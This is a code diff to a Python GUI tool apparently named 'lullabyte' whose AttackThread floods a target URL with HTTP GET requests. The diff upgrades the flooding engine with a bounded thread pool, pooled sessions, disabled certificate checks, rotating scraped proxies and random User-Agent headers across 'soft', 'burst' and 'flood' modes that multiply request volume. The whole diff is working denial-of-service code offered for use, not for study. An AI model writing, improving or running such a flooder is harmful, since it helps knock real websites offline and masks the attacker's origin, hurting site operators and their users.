@@ -4,6 +4,12 @@ import requests
 import random
 import threading
 from datetime import datetime
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from PIL import Image, ImageDraw, ImageFont
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
@@ -115,58 +121,111 @@ class AttackThread(QThread):
         self.running = True
         self.current_requests_sent = 0
 
+    def _build_workers(self, num):
+        """create a bounded thread pool and a shared pooled session."""
+        retry = Retry(total=1, connect=1, read=1, redirect=1, backoff_factor=0.1, status_forcelist=[])
+        adapter = HTTPAdapter(
+            pool_connections=num,
+            pool_maxsize=num,
+            max_retries=retry,
+            pool_block=True,
+        )
+        session = requests.Session()
+        session.mount("https://", adapter)
+        session.mount("http://", adapter)
+        return ThreadPoolExecutor(max_workers=num), session
+
+    def _send(self, session, headers, proxy):
+        session.get(
+            self.url,
+            headers=headers,
+            proxies=proxy,
+            timeout=5,
+            verify=False,
+        )
+
     def run(self):
         self.log_signal.emit("~ lullabyte activated ~")
 
         if self.use_proxy:
             self.log_signal.emit("fetching proxies...")
-            self.proxies = scrape_proxies()
+            proxies = scrape_proxies()
+            self.proxies = [p for p in proxies if p]
+            self.proxies = [{"http": p, "https": p} for p in self.proxies]
             if self.proxies:
                 self.log_signal.emit(f"found {len(self.proxies)} proxies :3")
             else:
                 self.log_signal.emit("no proxies found, going direct")
 
-        for i in range(self.num_requests):
-            if not self.running:
-                break
+        if self.attack_mode == "soft":
+            workers = 1
+        elif self.attack_mode == "burst":
+            workers = 16
+        else:
+            workers = 32
 
-            try:
-                headers = {"User-Agent": random.choice(USER_AGENTS)}
-                proxy = None
-                if self.use_proxy and self.proxies:
-                    proxy = {"http": random.choice(self.proxies), "https": random.choice(self.proxies)}
+        executor, session = self._build_workers(workers)
 
-                if self.attack_mode == "soft":
-                    requests.get(self.url, headers=headers, proxies=proxy, timeout=5)
-                elif self.attack_mode == "burst":
-                    threading.Thread(
-                        target=requests.get,
-                        args=(self.url,),
-                        kwargs={"headers": headers, "proxies": proxy, "timeout": 3},
-                        daemon=True,
-                    ).start()
-                elif self.attack_mode == "flood":
-                    for _ in range(5):
-                        threading.Thread(
-                            target=requests.get,
-                            args=(self.url,),
-                            kwargs={"headers": headers, "proxies": proxy, "timeout": 2},
-                            daemon=True,
-                        ).start()
-
-                self.current_requests_sent += 1
-                ts = datetime.now().strftime("%H:%M:%S")
-                self.log_signal.emit(f"[{ts}] request {self.current_requests_sent}/{self.num_requests} ({self.attack_mode})")
-                self.update_progress.emit(int((self.current_requests_sent / self.num_requests) * 100))
-
-            except requests.exceptions.RequestException as e:
-                self.log_signal.emit(f"[error] request failed: {e}")
-            except Exception as e:
-                self.log_signal.emit(f"[error] {e}")
+        try:
+            if self.attack_mode == "soft":
+                for _ in range(self.num_requests):
+                    if not self.running:
+                        break
+                    try:
+                        headers = {"User-Agent": random.choice(USER_AGENTS)}
+                        if self.use_proxy and self.proxies:
+                            proxy = random.choice(self.proxies)
+                        else:
+                            proxy = None
+                        self._send(session, headers, proxy)
+                        self._count_request()
+                    except requests.exceptions.RequestException as e:
+                        self.log_signal.emit(f"[error] request failed: {e}")
+            else:
+                futures = []
+                batch_target = 32 if self.attack_mode == "burst" else 64
+                for _ in range(self.num_requests * (1 if self.attack_mode == "burst" else 5)):
+                    if not self.running:
+                        break
+                    headers = {"User-Agent": random.choice(USER_AGENTS)}
+                    if self.use_proxy and self.proxies:
+                        proxy = random.choice(self.proxies)
+                    else:
+                        proxy = None
+                    futures.append(executor.submit(self._send, session, headers, proxy))
+                    if len(futures) >= batch_target:
+                        self._wait_batch(futures)
+                        futures = []
+                if futures:
+                    self._wait_batch(futures)
+        finally:
+            executor.shutdown(wait=True, cancel_futures=False)
+            session.close()
 
         if self.running:
             self.log_signal.emit("~ done! ~")
         self.update_progress.emit(0)
+
+    def _wait_batch(self, futures):
+        for fut in as_completed(futures):
+            if not self.running:
+                break
+            try:
+                fut.result()
+            except requests.exceptions.RequestException as e:
+                self.log_signal.emit(f"[error] request failed: {e}")
+            except Exception as e:
+                self.log_signal.emit(f"[error] {e}")
+            self._count_request()
+
+    def _count_request(self):
+        self.current_requests_sent += 1
+        ts = datetime.now().strftime("%H:%M:%S")
+        self.log_signal.emit(
+            f"[{ts}] request {self.current_requests_sent}/{self.num_requests} ({self.attack_mode})"
+        )
+        progress = int((self.current_requests_sent / self.num_requests) * 100)
+        self.update_progress.emit(min(progress, 100))
 
     def stop(self):
         self.running = False
